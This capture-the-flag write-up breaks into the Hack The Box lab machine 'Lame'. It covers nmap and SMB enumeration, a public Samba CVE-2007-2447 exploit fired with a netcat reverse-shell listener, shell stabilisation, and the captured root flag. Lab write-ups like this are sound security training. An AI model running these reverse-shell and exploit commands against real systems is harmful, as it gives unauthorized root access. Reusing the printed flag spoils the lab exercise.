# Lame
> Write-up author: jon-brandy
## DESCRIPTION:
- NONE
## HINT:
- NONE
## STEPS:
1. First, run nmap to the machine's host, so we can see all open ports and the service's running.

```sh
nmap -p- -sV -O -sVC 10.10.10.3
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210200834-fd61ad0f-e57d-4c34-af0c-663fc0e4ce31.png)

![image](https://user-images.githubusercontent.com/70703371/210200847-3663931c-6d30-429b-adde-26fe9fe58565.png)


2. Notice there's 2 ports that might be running some type of network shares. Not only that, we're allowed to login in ftp as anonymous.

![image](https://user-images.githubusercontent.com/70703371/210200591-280e0c35-7e9a-450f-b3cd-b5c7f448ff71.png)


![image](https://user-images.githubusercontent.com/70703371/210200876-cff53d63-2281-4b0f-a3e6-21591c5f1b3a.png)


3. Now let's login with ftp.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210200952-d0d2836b-dd36-4f60-8059-bb07a61edbe1.png)


4. Let's check are there any files or directories.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210201004-e1acce9b-8363-4406-9b9b-31b33d1c3fd4.png)


5. Got nothing.
6. Now let's do SMB enumeration.

```sh
smbmap -H 10.10.10.3
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210201182-4a75571d-55ba-4bc2-a37b-9ddd8ec454d4.png)


7. Notice there's 2 different directories than the others -> tmp, opt (doesn't have any dollar sign).

![image](https://user-images.githubusercontent.com/70703371/210201218-80dff691-4b63-47a0-9a08-9f84e40c5de4.png)

#### NOTES: 

```
tmp and opt doesn't have any dollar sign, means it can be accessed by regular use privileges.
```

8. Since only **tmp** directory with permissions to read and write, means **tmp** shall be our interest now. But the problem is we don't have any user credentials for this tmp directory.
9. Even though it's open here, but still we need user credentials to login to it.
10. Now let's use **search split** to potentially see if there's an exploit associated with the service version of samba that's running on this machine.

> RESULT

```sh
searchsploit samba 3.0.2
```

![image](https://user-images.githubusercontent.com/70703371/210201595-fb83c002-b0ef-4450-a9ca-d9d777b80f2e.png)


11. Based from the first output.

![image](https://user-images.githubusercontent.com/70703371/210201674-557895a0-5f71-4919-a613-913b2c2829ab.png)


12. We can use metasploit, but let's not use that tools, we want to dive in manually, let's start by find where this exploit stored on our kali linux (THE CVE NUMBER).

![image](https://user-images.githubusercontent.com/70703371/210201783-447f9a3f-ff63-4905-a77a-8a4a93f8e7f3.png)


> RESULT

```sh
cat /usr/share/exploitdb/exploits/unix/remote/16320.rb | grep CVE
```

![image](https://user-images.githubusercontent.com/70703371/210201888-d40c6da4-5683-446c-bdab-5fb2e9b36b70.png)


13. Let's jump to the url given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210202094-58193400-1969-4846-ba75-b43b2eaf6987.png)


![image](https://user-images.githubusercontent.com/70703371/210202106-36e7a9a7-e101-4d3e-8306-c9ea0ec6c3a1.png)


14. Based on the samba documentation, we know that there's a configuration option which is not enabled by default and it can lead to RCE.
15. Anyway when searched the CVE number at google, i found this github repository.

```
https://github.com/amriunix/CVE-2007-2447
```

16. Before run the script, run `nc -nlvp 4444` so we can grab the reverse shell spawned by listening.
17. Next run this payload:

```
python3 usermap_script.py 10.10.10.3 139 10.10.14.4 4444
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210202810-dc68003d-953e-4ade-ad7c-8a4d57f403de.png)

![image](https://user-images.githubusercontent.com/70703371/210202839-b54d45dc-40ab-4f66-8bbe-0d0abc4bd771.png)


18. Let's type `id` and `whoami`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210202885-0ff156e9-eb89-4857-8a95-375a6e938860.png)


19. We are `root`, that's great! We don't need privilege escalation then to solve this challenge.
20. The next thing to do now is to stabilize our shell first.
21. Let's run this python command:

```py
python -c 'import pty; pty.spawn("/bin/sh")'
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210203099-50b7ad5d-dd42-46f0-9ee5-0f330c2b35e1.png)

22. Now let's list all files or directories inside the machine.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210203135-4c5a55f4-24f9-4c9a-81af-d1f8d599c867.png)


23. Jump to the `root` directory. 

> INSIDE

![image](https://user-images.githubusercontent.com/70703371/210203191-594dfec1-aa54-4783-8411-fb170e3235df.png)


24. Cat the root.txt file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210203213-d3ee001a-3cc3-4de6-ba2e-151a4670eef3.png)


25. Got the flag!

## FLAG

```
46b24a994e2c264192df7f7c060f1fdd
```




